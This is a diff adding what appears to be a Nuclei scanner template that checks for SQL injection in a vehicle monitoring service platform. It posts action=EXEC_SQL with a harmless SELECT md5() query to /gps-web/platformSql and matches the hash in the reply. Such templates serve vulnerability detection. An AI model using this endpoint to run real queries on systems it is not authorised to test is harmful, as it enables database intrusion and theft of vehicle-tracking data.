@@ -1,0 +1,26 @@
+id: poc-yaml-31gps-platformSql-sqli
+info:
+  name: 三一谦成 车辆监控服务平台 platformSql SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/gps-web/platformSql'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=EXEC_SQL&params=SELECT md5({{t1}})
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{t2}}'
+        part: body
